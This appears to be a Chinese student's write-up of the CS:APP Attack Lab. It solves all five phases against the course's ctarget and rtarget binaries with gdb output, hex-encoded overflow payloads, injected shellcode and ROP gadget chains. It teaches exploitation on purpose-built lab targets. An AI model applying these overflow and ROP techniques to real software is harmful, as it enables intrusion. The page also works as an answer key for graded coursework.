lab3 target
===========

不同于上个实验，[官网](http://csapp.cs.cmu.edu/3e/attacklab.pdf)包含 *lab 3* 各个 *phase* 的教程，做实验前请通读

phase 1
-------
这一关就是让缓冲区溢出，使函数错误地跳转到 *touch1* 
``` 
(gdb) file ctarget
(gdb) b getbuf 
(gdb) r -q
(gdb) print touch1 
$1 = {void ()} 0x4017c0 <touch1>
```
```x86asm
<+0>: sub    $0x28,%rsp
<+4>: mov    %rsp,%rdi
<+7>: callq  0x401a40 <Gets>
```
可以看到缓冲区有 *0x28* 字节，我们只需要在 *%rsp + 0x29* 处填上 *touch1* 的地址 *0x4017c0* 即可
```bash
$cat ctarget.1.txt 
00 00 00 00 00 00 00 00      
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00      /* 0x28 bytes       */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00      
c0 17 40                     /* address of touch1 */

$./hex2raw < ctarget.1.txt | ./ctarget -q
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
```

phase 2
---------
*phase 2* 除了要跳转到 *touch2* ，还需要改变 *val* 值使其等于 *cookie* 
```
(gdb) print /x cookie
$1 = 0x59b997fa
(gdb) print touch2 
$2 = {void (unsigned int)} 0x4017ec <touch2>
(gdb) print $rsp
$3 = (void *) 0x5561dc78
```
所以要先 *ret* 回栈上，将 *cookie* 放在 *%rdi* ，然后再跳转到 *touch2* 
```bash
$cat injected_code.s 
movq   $0x59b997fa, %rdi     
movq   $0x4017ec, %rax
jmp    *%rax

$as injected_code.s & objdump -d a.out 
0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   48 c7 c0 ec 17 40 00    mov    $0x4017ec,%rax
   e:   ff e0                   jmpq   *%rax

$cat ctarget.2.txt 
48 c7 c7 fa 97 b9 59
48 c7 c0 ec 17 40 00
ff e0
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00

$./hex2raw < ctarget.2.txt | ./ctarget -q
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
```
这里要注意
```x86asm
jmp    *$0x4017ec
; --------------
movq   $0x4017ec, %rax
jmp    *%rax
```
是不一样的，关于间接跳转这一部分书上讲得不是很清楚，推荐大家看看[这篇文章](https://www.cnblogs.com/longdouhzt/archive/2012/12/02/2798101.html)  

但教程中并不推荐使用 *jmp* 和 *call*，建议所有的跳转都用 *ret*，即使并不是为了返回函数调用  

所以接下来改用 *ret* 来跳转到 *touch2*
```bash
$cat ctarget.2.txt 
48 c7 c7 fa 97 b9 59         /* movq   $59b997fa, %rdi   */
c3                           /* retq                     */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00      /* address of injected code */
ec 17 40 00 00 00 00 00      /* address of touch2        */

$./hex2raw < ctarget.2.txt | ./ctarget -q
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
```

phase 3
---------
```
(gdb) print /x cookie
$12 = 0x59b997fa
(gdb) print /x "59b997fa"
$13 = {0x35, 0x39, 0x62, 0x39, 0x39, 0x37, 0x66, 0x61, 0x0}
(gdb) print $rsp
$14 = (void *) 0x5561dc78
(gdb) print 0x10+$rsp    
$15 = (void *) 0x5561dc88
(gdb) print touch3 
$16 = {void (char *)} 0x4018fa <touch3>
```
由于函数 *hexmatch* 和 *strncmp* 被调用时存在压栈行为，会覆盖 *getbuf* 的部分缓冲区，所以我们的 *sval* 的内容必须放在栈顶（$rsp），将 *injected code* 放在后面（0x10 + $rsp）
```bash
$cat ctarget.3.txt 
35 39 62 39 39 37 66 61 00   /* ascii code of "59b997fa" */
00 00 00 00 00 00 00
48 c7 c7 78 dc 61 55         /* movq   $5561dc78, %rdi   */
c3                           /* retq                     */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
88 dc 61 55 00 00 00 00      /* address of injected code */
fa 18 40 00 00 00 00 00      /* address of touch3        */

$./hex2raw < ctarget.3.txt | ./ctarget -q
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
```

phase 4
-------

由于教程谈到过 *phase 4* 只会用到 *mid_farm* 之前的 *gadget* ,先把可能用到的机器码找出来
```bash
$objdump -d rtarget | egrep -n "((start|mid)+_farm)"
915:0000000000401994 <start_farm>:
951:00000000004019d0 <mid_farm>:

$objdump -d rtarget | sed -n "915, 951p" > farm_machine_code.txt
```
之后我们就可以在 *farm_machine_code* 里查找所需要的机器码了

让我们回忆下 *phase 2*，我们需要的仅仅是一个指令 
```x86asm
movq   $0x59b997fa, %rdi
```
可是依靠 *gadget* 我们是无法完成传送常数这么复杂的操作的  

联想到附录里提供了 *movq, popq* 的机器码，可以很自然地想到可以先把 *0x59b997fa* 放在栈中（因为可以通过缓冲区溢出自由地操纵栈），然后将其 *popq* 到某一寄存器，再通过 *movq* 传送到 *%rdi* 

已知 *movq S, D* 的机器码开头是 *48 89* ：
```bash
$egrep -a1 "48 89 [cdef][0-9a-f] (90|c3|   )" farm_machine_code.txt
00000000004019a0 <addval_273>:
  4019a0:       8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  4019a6:       c3                      retq
--
00000000004019c3 <setval_426>:
  4019c3:       c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
  4019c9:       c3
```
可以看到这两个都是（ *0x90* 是 *nop* ，空指令的意思）
```x86asm
movq   %rax %rdi
```
所以我们只需要机器码为 *58* 的
```x86asm
popq   %rax
```

```bash
$egrep -a1 "58 (90|c3|   )" farm_machine_code.txt
00000000004019a7 <addval_219>:
  4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
  4019ad:       c3                      retq
--
00000000004019ca <getval_280>:
  4019ca:       b8 29 58 90 c3          mov    $0xc3905829,%eax
  4019cf:       c3                      retq
```
计划通$\checkmark$

因此我们的栈中要依次存储 *poqq %rax* 的地址，*cookie* 的值，*movq %rax %rdi* 的地址， *touch2* 的地址
```bash
$cat rtarget.4.txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00

$./hex2raw < rtarget.4.txt | ./rtarget -q
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
```

phase 5
-------

由于使用了栈随机化，*phase 5* 的关键是凑出输入字符串的地址（一个和 *%rsp* 有关的值），将其传送进 *%rdi*

让我们先看看能使用的 *gadget* 有哪些（不熟悉正则表达式的小伙伴可能要先去预习下 :-)
```bash
$egrep -a1 "5[89abcdef] (90|c3|   |(20|08|38|04) (c0|c9|d2|db))" farm_machine_code.txt
00000000004019a7 <addval_219>:
  4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
  4019ad:       c3                      retq
--
00000000004019ca <getval_280>:
  4019ca:       b8 29 58 90 c3          mov    $0xc3905829,%eax
  4019cf:       c3                      retq

$egrep -a1 "48 89 [cdef][0-9a-f] (90|c3|   |(20|08|38|84) (c0|c9|d2|db))" farm_machine_code.txt
00000000004019a0 <addval_273>:
  4019a0:       8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  4019a6:       c3                      retq
--
00000000004019c3 <setval_426>:
  4019c3:       c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
  4019c9:       c3                      retq
--
0000000000401a03 <addval_190>:
  401a03:       8d 87 41 48 89 e0       lea    -0x1f76b7bf(%rdi),%eax
  401a09:       c3                      retq
--
0000000000401aab <setval_350>:
  401aab:       c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)
  401ab1:       c3                      retq

$egrep -a1 "([^8]|[^4]8) 89 [cdef][0-9a-f] (90|c3|  |(20|08|38|84) (c0|c9|d2|db))" farm_machine_code.txt
00000000004019db <getval_481>:
  4019db:       b8 5c 89 c2 90          mov    $0x90c2895c,%eax
  4019e0:       c3                      retq
--
0000000000401a11 <addval_436>:
  401a11:       8d 87 89 ce 90 90       lea    -0x6f6f3177(%rdi),%eax
  401a17:       c3                      retq
--
0000000000401a25 <addval_187>:
  401a25:       8d 87 89 ce 38 c0       lea    -0x3fc73177(%rdi),%eax
  401a2b:       c3                      retq
--
0000000000401a33 <getval_159>:
  401a33:       b8 89 d1 38 c9          mov    $0xc938d189,%eax
  401a38:       c3                      retq
--
0000000000401a39 <addval_110>:
  401a39:       8d 87 c8 89 e0 c3       lea    -0x3c1f7638(%rdi),%eax
  401a3f:       c3                      retq
--
0000000000401a40 <addval_487>:
  401a40:       8d 87 89 c2 84 c0       lea    -0x3f7b3d77(%rdi),%eax
  401a46:       c3                      retq
--
0000000000401a68 <getval_311>:
  401a68:       b8 89 d1 08 db          mov    $0xdb08d189,%eax
  401a6d:       c3                      retq
--
0000000000401a83 <addval_358>:
  401a83:       8d 87 08 89 e0 90       lea    -0x6f1f76f8(%rdi),%eax
  401a89:       c3                      retq
```
对照表格，我们可以发现只有以下这些指令是可以使用的
```x86asm
popq   %rax             (1)

movq   %rax, %rdi       (2)
movq   %rsp, %rax       (3)

movl   %eax, %edx       (4)
movl   %ecx, %esi       (5)
movl   %edx, %ecx       (6)
movl   %esp, %eax       (7)
```
看起来似乎没有什么有用的，但注意到函数 *add_xy* 
```x86asm
00000000004019d6 <add_xy>:
  4019d6:       48 8d 04 37             lea    (%rdi,%rsi,1),%rax
  4019da:       c3                      retq
```
这里有个加法运算，其使用的寄存器 *%rdi, %rsi, %rax* 都是我们能操作的  

所以大概思路就是通过 *%rsp* 和某个栈中常数计算出 *sval* 的首地址
$$\left .
   \begin{aligned}
      \%rsp \xrightarrow{(3)} \%rax \xrightarrow{(2)} \%rdi \\
      const\xrightarrow{(1)} \%rax \xrightarrow{(4)} \%edx \xrightarrow{(6)} \%ecx \xrightarrow{(5)} \%esi 
   \end{aligned}
\right\}
\xrightarrow{add\_xy} \%rax \xrightarrow{(2)} \%rdi$$

计划通$\checkmark\quad$接下来的是就是确定 *const* 的值了，这里要注意的是，由于使用了 *movl* ，所以 *const* 不能是负值，不能把字符串放在栈顶

假如按照 (3)(2)(1)(4)(6)(5)(add_xy)(2) 的顺序，那么 $const = 9 * 0x8 = 0x48$
```bash
$cat rtarget.5.txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

06 1a 40 00 00 00 00 00      /*   movq   %rsp, %rax      */
a2 19 40 00 00 00 00 00      /*   movq   %rax, %rdi      */
ab 19 40 00 00 00 00 00      /*   popq   %rax            */
48 00 00 00 00 00 00 00      /*   const value            */
dd 19 40 00 00 00 00 00      /*   movl   %eax, %edx      */
34 1a 40 00 00 00 00 00      /*   movl   %edx, %ecx      */
13 1a 40 00 00 00 00 00      /*   movl   %ecx, %esi      */
d6 19 40 00 00 00 00 00      /*   address of add_xy      */
a2 19 40 00 00 00 00 00      /*   movq   %rax, %rdi      */
fa 18 40 00 00 00 00 00      /*   address of touch3      */
35 39 62 39 39 37 66 61 00   /* ascii code of "59b997fa" */
```